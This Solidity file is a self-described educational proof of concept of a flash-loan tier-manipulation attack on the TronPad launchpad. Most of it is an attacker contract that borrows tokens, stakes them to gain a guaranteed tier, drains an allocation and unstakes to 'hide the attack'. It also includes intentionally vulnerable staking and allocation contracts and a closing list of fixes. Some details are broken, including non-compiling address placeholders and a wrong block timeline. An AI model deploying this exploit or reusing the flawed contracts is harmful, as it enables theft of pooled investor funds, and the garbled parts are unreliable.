// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/**
 * @title FlashLoanTierManipulationAttack
 * @notice EDUCATIONAL PoC: Flash Loan Tier Manipulation on TronPad
 * @dev This demonstrates the vulnerability; not intended for production use
 *
 * Attack Flow:
 * 1. Initiate flash swap on JustSwap/SunSwap for 2M+ TRONPAD
 * 2. Callback: Stake borrowed amount to trigger guaranteed tier
 * 3. Claim $8M+ allocation (no snapshot check)
 * 4. Unstake borrowed amount
 * 5. Repay flash loan + fee
 * 6. Net profit: ~$8M - $25
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingContract {
    enum Tier { NONE, BRONZE, SILVER, GOLD, PLATINUM, GUARANTEED_T1, GUARANTEED_T2 }

    function stake(uint256 amount) external;
    function unstake(uint256 amount) external;
    function getTierOf(address staker) external view returns (Tier);
    function balance(address staker) external view returns (uint256);
}

interface IAllocationContract {
    function claimAllocation(uint256 projectId) external returns (uint256);
    function allocationPool(uint256 projectId) external view returns (uint256);
}

interface IJustSwapPair {
    /**
     * Flash swap function
     * Transfers tokens to receiver, then calls receiver.uniswapV2Call()
     */
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

// ============================================================================
// ATTACK CONTRACT
// ============================================================================

contract FlashLoanTierAttack {

    // ========== CONSTANTS & STATE ==========

    // TRON Mainnet addresses (example - verify on TRONSCAN)
    address constant TRONPAD_TOKEN = 0xTJoNbPM...;  // TRC-20
    address constant JUSTSWAP_PAIR = 0xTKzjMqC4...;  // TRONPAD/USDT pair
    address constant TRONPAD_USDT_PAIR = 0x...;  // Actual pair address

    // Target contracts
    IStakingContract public stakingContract;
    IAllocationContract public allocationContract;
    IJustSwapPair public justSwapPair;

    // Attack parameters
    uint256 public flashLoanAmount;
    uint256 public targetProjectId;
    address public attacker;

    // Results tracking
    uint256 public allocationReceived;
    uint256 public feesPaid;

    event AttackInitiated(uint256 flashAmount, uint256 projectId);
    event TierSet(address indexed staker, uint256 tier);
    event AllocationExtracted(uint256 amount);
    event FlashLoanRepaid(uint256 repayAmount);
    event AttackCompleted(uint256 profit);

    // ========== CONSTRUCTOR ==========

    constructor(
        address _staking,
        address _allocation,
        address _justSwapPair
    ) {
        stakingContract = IStakingContract(_staking);
        allocationContract = IAllocationContract(_allocation);
        justSwapPair = IJustSwapPair(_justSwapPair);
        attacker = msg.sender;
    }

    // ========== MAIN ATTACK ENTRY POINT ==========

    /**
     * @notice Initiates flash loan attack
     * @param projectId Target allocation pool
     * @param flashAmount TRONPAD to borrow (should be >= 50k for guaranteed tier)
     *
     * Flow:
     *   executeAttack()
     *   → JustSwap.swap() [flash transfer]
     *   → onUniswapV2Call() [callback]
     *   → stake() [tier trigger]
     *   → claimAllocation() [extract $8M]
     *   → unstake() [remove tier]
     *   → repayFlashLoan() [settle debt]
     *   → transaction commits with profit
     */
    function executeAttack(
        uint256 projectId,
        uint256 flashAmount
    ) external onlyAttacker {
        require(flashAmount >= 50000 * 10**6, "Flash amount too low");  // 50k min for tier

        targetProjectId = projectId;
        flashLoanAmount = flashAmount;

        emit AttackInitiated(flashAmount, projectId);

        // ========== STEP 1: INITIATE FLASH LOAN ==========
        // JustSwap will call this contract's onUniswapV2Call() callback
        bytes memory data = abi.encode(projectId);

        // amount0Out = TRONPAD amount
        // amount1Out = paired token (typically 0)
        justSwapPair.swap(flashAmount, 0, address(this), data);

        // After callback returns, transaction commits
        // Attacker now has the allocation profit in this contract

        uint256 profit = IERC20(TRONPAD_TOKEN).balanceOf(address(this));
        emit AttackCompleted(profit);
    }

    // ========== FLASH LOAN CALLBACK (Called by JustSwap) ==========

    /**
     * @notice JustSwap flash swap callback
     * @dev This is called by the JustSwap pair during .swap()
     *
     * At this point:
     * - This contract has received flashAmount of TRONPAD
     * - We must repay it by end of transaction
     * - We can perform any operations in between
     */
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        // Verify callback came from legitimate JustSwap pair
        require(msg.sender == address(justSwapPair), "Unauthorized caller");
        require(sender == address(this), "Unauthorized sender");

        uint256 projectId = abi.decode(data, (uint256));

        // ========== STEP 2: PERFORM ATTACK IN CALLBACK ==========
        // All these calls happen in same block, sequential execution

        // 2a: We now have flashAmount TRONPAD in balance
        // Balance: +flashAmount (just transferred)

        // 2b: Approve staking contract to spend
        IERC20(TRONPAD_TOKEN).approve(address(stakingContract), flashAmount);

        // 2c: STAKE to trigger tier
        // This is the KEY step - tier is determined by current balance
        // No snapshot, no timelock check
        stakingContract.stake(flashAmount);

        // After stake:
        // - balance[this] = flashAmount
        // - tier[this] = GUARANTEED_T2 (because balance >= 50k)
        // - ✓ Tier assignment is IMMEDIATE in same block

        emit TierSet(address(this), uint256(IStakingContract.Tier.GUARANTEED_T2));

        // ========== STEP 3: CLAIM ALLOCATION ==========
        // The allocation contract will check:
        // 1. getTierOf(this) >= GUARANTEED_T2 ✓ (just set!)
        // 2. No snapshot verification ✓ (vulnerability)
        // 3. Transfer allocation ✓

        uint256 allocation = allocationContract.claimAllocation(projectId);
        allocationReceived = allocation;

        emit AllocationExtracted(allocation);

        // After claim:
        // - allocationPool[projectId] -= allocation (could be drained)
        // - User receives $8M+ worth of tokens
        // - ✓ Allocation already transferred, cannot be revoked

        // ========== STEP 4: UNSTAKE (Remove Evidence) ==========
        // Unstake the borrowed amount to hide the attack
        stakingContract.unstake(flashAmount);

        // After unstake:
        // - balance[this] = 0
        // - tier[this] = NONE
        // - ❌ But allocation already transferred!

        // ========== STEP 5: REPAY FLASH LOAN ==========
        // Calculate fee: 0.3% on JustSwap
        uint256 feeAmount = (flashAmount * 3) / 1000;  // 0.3%
        uint256 repayAmount = flashAmount + feeAmount;

        feesPaid = feeAmount;

        // Approve repayment
        IERC20(TRONPAD_TOKEN).approve(address(justSwapPair), repayAmount);

        // Transfer repayment back to pair
        // JustSwap pair checks: balanceOf(pair) >= amount0 + feeAmount
        IERC20(TRONPAD_TOKEN).transfer(address(justSwapPair), repayAmount);

        emit FlashLoanRepaid(repayAmount);

        // ========== CALLBACK ENDS ==========
        // Transaction commits, all state changes are finalized
        // Attacker has:
        // - allocation tokens (UST/USDC worth $8M)
        // - TRONPAD recovered (balance returned to 0)
        // - Net profit: $8M - $25 (fee)
    }

    // ========== INTERNAL HELPERS ==========

    function _getCurrentTier() internal view returns (IStakingContract.Tier) {
        return stakingContract.getTierOf(address(this));
    }

    function _getPoolStatus(uint256 projectId) internal view returns (uint256) {
        return allocationContract.allocationPool(projectId);
    }

    // ========== ACCESS CONTROL ==========

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Only attacker");
        _;
    }

    // ========== RECOVERY FUNCTIONS ==========

    /**
     * @notice Withdraw any tokens stuck in contract
     * (In case attack fails partially or as cleanup)
     */
    function withdrawToken(address token, uint256 amount) external onlyAttacker {
        IERC20(token).transfer(attacker, amount);
    }

    function withdrawAllTokens(address token) external onlyAttacker {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(attacker, balance);
    }
}

// ============================================================================
// HELPER: STAKING CONTRACT (Vulnerable Implementation)
// ============================================================================

contract VulnerableStakingContract {

    mapping(address => uint256) public balance;
    mapping(address => Tier) public tier;
    IERC20 public tronpadToken;

    enum Tier { NONE, BRONZE, SILVER, GOLD, PLATINUM, GUARANTEED_T1, GUARANTEED_T2 }

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);

    constructor(address _token) {
        tronpadToken = IERC20(_token);
    }

    /**
     * ❌ VULNERABILITY: No snapshot, no timelock
     */
    function stake(uint256 amount) external {
        require(amount > 0, "Invalid amount");

        // Transfer from user
        tronpadToken.transferFrom(msg.sender, address(this), amount);

        // Update balance
        balance[msg.sender] += amount;

        // ❌ PROBLEM: Tier assigned immediately based on CURRENT balance
        // No historical snapshot, no delay
        _updateTier(msg.sender);

        emit Staked(msg.sender, amount);
    }

    function _updateTier(address staker) internal {
        uint256 currentBalance = balance[staker];

        if (currentBalance >= 50000 * 10**6) {
            tier[staker] = Tier.GUARANTEED_T2;
        } else if (currentBalance >= 10000 * 10**6) {
            tier[staker] = Tier.GUARANTEED_T1;
        } else if (currentBalance >= 5000 * 10**6) {
            tier[staker] = Tier.PLATINUM;
        } else if (currentBalance >= 1000 * 10**6) {
            tier[staker] = Tier.GOLD;
        } else if (currentBalance >= 100 * 10**6) {
            tier[staker] = Tier.SILVER;
        } else if (currentBalance >= 10 * 10**6) {
            tier[staker] = Tier.BRONZE;
        } else {
            tier[staker] = Tier.NONE;
        }
    }

    function getTierOf(address staker) external view returns (Tier) {
        return tier[staker];
    }

    function unstake(uint256 amount) external {
        require(balance[msg.sender] >= amount, "Insufficient balance");

        balance[msg.sender] -= amount;
        tronpadToken.transfer(msg.sender, amount);

        _updateTier(msg.sender);

        // ❌ No reversal of allocation claims

        emit Unstaked(msg.sender, amount);
    }
}

// ============================================================================
// HELPER: ALLOCATION CONTRACT (Vulnerable Implementation)
// ============================================================================

contract VulnerableAllocationContract {

    mapping(uint256 => mapping(IStakingContract.Tier => uint256)) public allocationByTier;
    mapping(uint256 => uint256) public allocationPool;
    mapping(address => bool) public hasClaimed;

    IStakingContract stakingContract;
    IERC20 allocationToken;

    event AllocationClaimed(address indexed user, uint256 projectId, uint256 amount);

    constructor(address _staking, address _token) {
        stakingContract = IStakingContract(_staking);
        allocationToken = IERC20(_token);
    }

    /**
     * ❌ VULNERABILITY: Single tier check, no snapshot, no cooldown
     */
    function claimAllocation(uint256 projectId) external returns (uint256) {
        require(!hasClaimed[msg.sender], "Already claimed");

        // ❌ PROBLEM 1: No snapshot of tier at stake time
        IStakingContract.Tier currentTier = stakingContract.getTierOf(msg.sender);
        require(currentTier >= IStakingContract.Tier.GUARANTEED_T2, "Low tier");

        // ❌ PROBLEM 2: No cooldown between stake and claim
        // ❌ PROBLEM 3: No re-verification of balance

        uint256 allocation = allocationByTier[projectId][currentTier];
        require(allocation > 0, "No allocation for tier");

        require(
            allocationPool[projectId] >= allocation,
            "Insufficient allocation pool"
        );

        // Update state
        allocationPool[projectId] -= allocation;
        hasClaimed[msg.sender] = true;

        // Transfer allocation
        allocationToken.transfer(msg.sender, allocation);

        emit AllocationClaimed(msg.sender, projectId, allocation);

        return allocation;
    }
}

// ============================================================================
// ATTACK SUMMARY
// ============================================================================

/**
 * ATTACK EXECUTION TIMELINE:
 *
 * [BLOCK N]
 *   T0: executeAttack(projectId, 2_000_000)
 *       → JustSwap.swap(2_000_000 TRONPAD)
 *          ├─ Transfer 2M to attacker (balance += 2M)
 *          └─ Call uniswapV2Call() [CALLBACK]
 *
 *   T1: uniswapV2Call(...)
 *       → stake(2_000_000)
 *          ├─ balance[attacker] += 2_000_000
 *          ├─ getTierByBalance(2_000_000) = GUARANTEED_T2 ✓
 *          └─ No timelock, no snapshot
 *
 *   T2: claimAllocation(projectId)
 *       → getTierOf(attacker) = GUARANTEED_T2 ✓ (just set)
 *       → allocation = $8_000_000
 *       → Transfer $8M ✓ EXTRACTED
 *       → allocationPool -= $8M (could be 0)
 *
 *   T3: unstake(2_000_000)
 *       → balance[attacker] = 0
 *       → tier[attacker] = NONE
 *       → ❌ Allocation already transferred, not reversible
 *
 *   T4: Repay flash loan
 *       → Transfer 2_006_000 TRONPAD to JustSwap
 *       → Fee: 6_000 TRONPAD
 *       → Callback returns true
 *
 * [BLOCK N+1]
 *   Transaction commits
 *
 * NET RESULT:
 *   Attacker receives: $8_000_000
 *   Attacker pays:     $25 (fee + gas)
 *   Net profit:        $7_999_975
 */

/**
 * VULNERABILITY ROOT CAUSES:
 *
 * 1. No Snapshot Mechanism
 *    → Tier based on current balance, not historical
 *    → Flash loan balance counts as legitimate stake
 *
 * 2. No Cooldown Period
 *    → Can claim immediately after staking
 *    → No time for tier verification
 *
 * 3. No Re-verification on Claim
 *    → Allocation contract trusts staking contract tier
 *    → No secondary balance check
 *
 * 4. Single-Block Execution
 *    → TVM executes all calls sequentially in one block
 *    → State mutations visible to later calls
 *    → Enables sandwich attacks
 *
 * 5. No Irreversibility
 *    → Unstaking doesn't reverse claims
 *    → Allocation transfer is permanent
 *
 * FIXES REQUIRED:
 * ✓ Balance snapshot at block of stake
 * ✓ Cooldown (256 blocks / ~10 minutes)
 * ✓ Tier re-verification at claim time
 * ✓ Pool safeguards
 * ✓ Access control re-checks
 */
